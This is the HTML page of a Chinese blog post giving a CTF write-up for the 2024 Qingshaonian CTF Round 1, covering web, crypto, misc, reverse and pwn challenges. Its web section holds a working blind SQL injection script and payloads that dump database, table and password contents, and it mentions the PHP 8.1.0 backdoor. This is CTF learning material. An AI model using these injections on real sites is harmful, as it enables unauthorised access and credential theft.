@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>青少年CTF擂台挑战赛 2024 #Round 1 WriteUp | BetaCat&#39;s Blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://betacatiz.github.io/favicon.ico?v=1715055299943">
+<link rel="stylesheet" href="https://betacatiz.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+WEB
+
+PHP的后门
+EasyMD5
+EasySQLi
+
+
+CRYPTO
+
+解个方程
+ez_log
+四重加密
+
+
+MISC
+
+CTFer revenge
+多情
+小光的答案之书
+ez_model
+
+
+REVERSE
+
+来打CS咯
+
+
+PW..." />
+    <meta name="keywords" content="WP" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://betacatiz.github.io">
+        <img src="https://betacatiz.github.io/images/avatar.png?v=1715055299943" class="site-logo">
+        <h1 class="site-title">BetaCat&#39;s Blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="https://betacatiz.github.io" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      猫猫狗狗
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://betacat.top" target="_blank">BetaCat</a> | <a class="rss" href="https://betacatiz.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">青少年CTF擂台挑战赛 2024 #Round 1 WriteUp</h2>
+            <div class="post-date">2024-02-29</div>
+            
+            <div class="post-content" v-pre>
+              <p><ul class="markdownIt-TOC">
+<li><a href="#web"><strong>WEB</strong></a>
+<ul>
+<li><a href="#php%E7%9A%84%E5%90%8E%E9%97%A8">PHP的后门</a></li>
+<li><a href="#easymd5">EasyMD5</a></li>
+<li><a href="#easysqli">EasySQLi</a></li>
+</ul>
+</li>
+<li><a href="#crypto"><strong>CRYPTO</strong></a>
+<ul>
+<li><a href="#%E8%A7%A3%E4%B8%AA%E6%96%B9%E7%A8%8B">解个方程</a></li>
+<li><a href="#ez_log">ez_log</a></li>
+<li><a href="#%E5%9B%9B%E9%87%8D%E5%8A%A0%E5%AF%86">四重加密</a></li>
+</ul>
+</li>
+<li><a href="#misc"><strong>MISC</strong></a>
+<ul>
+<li><a href="#ctfer-revenge">CTFer revenge</a></li>
+<li><a href="#%E5%A4%9A%E6%83%85">多情</a></li>
+<li><a href="#%E5%B0%8F%E5%85%89%E7%9A%84%E7%AD%94%E6%A1%88%E4%B9%8B%E4%B9%A6">小光的答案之书</a></li>
+<li><a href="#ez_model">ez_model</a></li>
+</ul>
+</li>
+<li><a href="#reverse"><strong>REVERSE</strong></a>
+<ul>
+<li><a href="#%E6%9D%A5%E6%89%93cs%E5%92%AF">来打CS咯</a></li>
+</ul>
+</li>
+<li><a href="#pwn"><strong>PWN</strong></a>
+<ul>
+<li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%95%B0%E5%AD%A6%E9%A2%98">简单的数学题</a></li>
+</ul>
+</li>
+</ul>
+</p>
+<h1 id="web"><strong>WEB</strong></h1>
+<h2 id="php的后门">PHP的后门</h2>
+<p>php-8.1.0版本的后门漏洞</p>
+<p>用hackbar设置即可</p>
+<h2 id="easymd5">EasyMD5</h2>
+<p>点开有两个文件上传</p>
+<p>需要上传pdf文件，且两个pdf不同，但md5值相等</p>
+<p>用fastcoll生成即可</p>
+<pre><code class="language-shell">.\fastcoll_v1.0.0.5.exe -p C:\Users\Eileeny\Desktop\1.pdf -o C:\Users\Eileeny\Desktop\1.pdf C:\Users\Eileeny\Desktop\2.pdf
+</code></pre>
+<h2 id="easysqli">EasySQLi</h2>
+<p>基于post的布尔盲注</p>
+<p>用python脚本跑</p>
+<pre><code class="language-py">import requests
+
+# 网站路径
+
+url = &quot;http://challenge.qsnctf.com:30180/login.php&quot;
+
+# 判断长度的payload
+
+payload_len = &quot;&quot;&quot;a' or length(
+                    (database())
+                )&gt;{n} #&quot;&quot;&quot;
+
+# 枚举字符的payload
+
+payload_str = &quot;&quot;&quot;a' or ascii(
+                    substr(
+                        (select database())
+                    ,{l},1)
+                )={n} #&quot;&quot;&quot;
+
+# post请求参数
+
+data= {
+    &quot;uname&quot;: &quot;&quot;,
+    &quot;psw&quot;: &quot;1&quot;
+}
+
+# 判断长度
+
+def getLen(payload_len):
+    length = 1
+    while True:
+
+        # 修改请求参数
+
+​        data[&quot;uname&quot;] = payload_len.format(n = length)
+​        response = requests.post(url, data)
+​        print(response.text)
+
+        # 出现此内容为登录成功
+
+​        if 'Login successful' in response.text:
+​            print('正在测试长度：', length)
+​            length += 1
+​        else:
+​            print('测试成功，长度为：', length)
+​            return length
+
+# 枚举字符
+
+def getStr(length):
+    str = ''
+
+    # 从第一个字符开始截取
+
+​    for l in range(1, length+1):
+
+        # 枚举字符的每一种可能性
+
+​        for n in range(32, 126):
+​            data[&quot;uname&quot;] = payload_str.format(l=l, n=n)
+​            response = requests.post(url=url, data=data)
+​            if 'Login successful' in response.text:
+​                str += chr(n)
+​                print('第', l, '个字符枚举成功：',str )
+​                break
+
+length = getLen(payload_len)
+getStr(length)
+</code></pre>
+<pre><code class="language-sql">1' or (select count(schema_name) from information_schema.schemata)=5#
+</code></pre>
+<p>手动爆出来有5个数据库</p>
+<p>库名 qsnctf</p>
+<pre><code class="language-sql">a' or (select count(table_name) from information_schema.tables where table_schema='qsnctf')=1 #
+</code></pre>
+<p>表的个数为1</p>
+<p>猜解指定数据库中表名长度</p>
+<pre><code class="language-sql">a' or length((select table_name from information_schema.tables where table_schema='qsnctf' limit 0,1))
+</code></pre>
+<p>猜解指定数据库中表名</p>
+<pre><code class="language-sql">a' or ascii(substr((select table_name from information_schema.tables where table_schema='qsnctf' limit 0,1),{l},1))
+</code></pre>
+<p>表是<strong>users</strong></p>
+<p>猜解指定数据库中指定表的列数</p>
+<pre><code class="language-sql">a' or (select count(column_name) from information_schema.columns where table_schema='qsnctf' and table_name='users')
+</code></pre>
+<p>三列</p>
+<p>猜解指定数据库中指定表的指定列的长度</p>
+<pre><code class="language-sql">a' or length((select column_name from information_schema.columns where table_schema='qsnctf' and table_name='users' limit 0,1))
+</code></pre>
+<p>猜解指定数据库中指定表的列的名字</p>
+<pre><code class="language-sql">a' or ascii(substr((select column_name from information_schema.columns where table_schema='qsnctf' and table_name='users' limit 0,1),{l},1)) #
+</code></pre>
+<p>分别是id username password</p>
+<p>猜解指定数据库中指定表的指定列的内容个数</p>
+<pre><code class="language-sql">a' or (select count(id) from users)
+</code></pre>
+<p>猜解指定数据库中指定表的指定列的内容长度</p>
+<pre><code class="language-sql">a' or length((select id from users limit 0,1))
+</code></pre>
+<p>猜解指定数据库中指定表的指定列的内容</p>
+<pre><code class="language-sql">a' or ascii(substr((select id from users limit 0,1),{l},1))
+</code></pre>
+<p>id列有两个数据，</p>
+<p>1 和 2</p>
+<p>username列有两个数据</p>
+<p>admin user</p>
+<p>password列有两个数据</p>
+<p>123456 和 <strong>qsnctf{c01dbd144570443283501810fd592a07}</strong></p>
+<h1 id="crypto"><strong>CRYPTO</strong></h1>
+<h2 id="解个方程">解个方程</h2>
+<p>flag:qsnctf{8e5d8c07a0c14b0e9fa03c19df7e8728}</p>
+<p>RSA,已知p，q，e，求d</p>
+<pre><code class="language-python">import gmpy2
+p = 159321896677619447938612410213707703277
+q = 233919644265895034751157128177026418817
+e = 65537
+phi_n = ( p - 1 ) * ( q - 1 ) 
+print ( gmpy2.invert ( e , phi_n ) )
+</code></pre>
+<p>提交d后得到flag</p>
+<h2 id="ez_log">ez_log</h2>
+<p>flag:qsnctf{7a1a12a521034588ad0485f56df6c271}</p>
+<p>离散对数问题，用sage解决</p>
+<pre><code class="language-python">n = 3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037
+m = 3
+c = 2942499086260575007456275705950978423224027906664535985972351196799739998071558270252547028321035227353504158940484860266945926967328136766272091300445921634497414856123032466570637049683198
+ZmodN = Zmod(n)
+
+m = ZmodN(m)
+c = ZmodN(c)
+
+print (c.log(m))
+</code></pre>
+<p>提交key后获得flag</p>
+<h2 id="四重加密">四重加密</h2>
+<p>flag:qsnctf{ldvgosdabv_kfkjc_jcvsbdi}</p>
+<p>第一层base32，压缩包密码<code>qsnctf</code></p>
+<p>第二层HTML，<code>zcye{mxmemtxrzt_lzbha_kwmqzec}|key=hello</code></p>
+<p>第三层维吉尼亚，<code>synt{yqitbfqnoi_xsxwp_wpifoqv}</code></p>
+<p>第四层rot13，<code>flag{ldvgosdabv_kfkjc_jcvsbdi}</code></p>
+<h1 id="misc"><strong>MISC</strong></h1>
+<h2 id="ctfer-revenge">CTFer revenge</h2>
+<p>flag:qsnctf{b414e3e3a6449ddba0997db259203eb7}</p>
+<p>给了一个txt，发现是倒置的十六进制文件，脚本将其逆序</p>
+<pre><code class="language-python">def extract_specific_range(file_path, output_file_path):
+    extracted_data = []
+    with open(file_path, 'r', encoding='utf-8') as file:
+        for line in file:
+            if len(line) &gt; 66:
+                extracted_data.append(line[20:67])
+            else:
+                extracted_data.append(line[20:])
+    text = ''.join(extracted_data).replace(' ', '')
+    reversed_text = text[::-1]
+    with open(output_file_path, 'w', encoding='utf-8') as output_file:
+        output_file.write(reversed_text)
+
+file_path = &quot;D:\\桌面\\是什么呢（仔细观察）.txt&quot;
+output_file_path = &quot;D:\\桌面\\output.txt&quot;
+extract_specific_range(file_path, output_file_path)
+</code></pre>
+<p>得到加密压缩包，爆破得到密码<code>z12345</code>，解压得到flag图片</p>
+<h2 id="多情">多情</h2>
+<p>flag:qsnctf{Lrp5mJcdEbbv2bnf6HQSNh}</p>
+<p>一个png和一串HTML编码的txt，png发现了嵌套png，提取出来爆破宽高得到数字<code>996</code>，结合txt文件名的第n个1和0，将996转为二进制<code>111100100</code>，对应的HTML转为ascaii，最后加上qsnctf{}得到flag</p>
+<h2 id="小光的答案之书">小光的答案之书</h2>
+<p>flag:qsnctf{49e7bd5efe114cd2d93ef60ddb2f8714}</p>
+<p>圣堂武士密码，解密得到<code>life</code>，关注公众号回复关键词即可</p>
+<h2 id="ez_model">ez_model</h2>
+<p>flag:qsnctf{d0b1e37104739d71b92fb1a93aa8cf09}</p>
+<p>pth文件，查询得知是pytorch，查看模型</p>
+<pre><code class="language-python">import torch
+model = torch.load(&quot;D:\\桌面\\easy.pth&quot;)
+print(model)
+</code></pre>
+<p>得到了flag和hint</p>
+<p><code>Flag: LidUJ3fQM2FVJoxpDwLvDyF3DwpPdwxOEgbQJoxnEgdnJgnojoZ5mF Hint: ZzYyXxAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWw0123456789+/</code></p>
+<p>可以知道是base64变表，hint为变表，flag为编码</p>
+<p>解码得到flag</p>
+<h1 id="reverse"><strong>REVERSE</strong></h1>
+<h2 id="来打cs咯">来打CS咯</h2>
+<p>flag:qsnctf{10.0.80.253:8118}</p>
+<p>杀毒软件报后门病毒，结合题目要交的flag分析是要找程序连接的远程IP</p>
+<p>ida分析无果，去wireshark抓取流量</p>
+<p>exe启动后发现了IP和端口，得到flag</p>
+<h1 id="pwn"><strong>PWN</strong></h1>
+<h2 id="简单的数学题">简单的数学题</h2>
+<p>nc连接 回答三个数学题即可</p>
+<pre><code>nc challenge.qsnctf.com 30817
+[*]Welcome! Please solve an equation.
+[*]Challenge 1: 2*15^2-1/x+15-6=458.875 Please tell me the result of x.
+8
+[*]True! This problem is very simple! Right?!
+
+[*]Challenge 2: 5+sqrt(x)=8 Please tell me the result of x.
+[*]Hint: Sqrt means radical sign.
+9
+[*]True! This problem is very simple! Right?!
+
+[*]Challenge 3: x^10+2^10-4*x=6131066258749 Please tell me the result of x.
+19
+[*]True! This problem is very simple! Right?!
+
+[*]Here you go, flag.
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://betacatiz.github.io/tag/OEDu25kST/" class="tag">
+                    WP
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://betacatiz.github.io/post/di-san-jie-isctf-xin-sheng-lian-he-sai-writeup/">
+                  <h3 class="post-title">
+                    第三届ISCTF新生联合赛 WriteUp
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
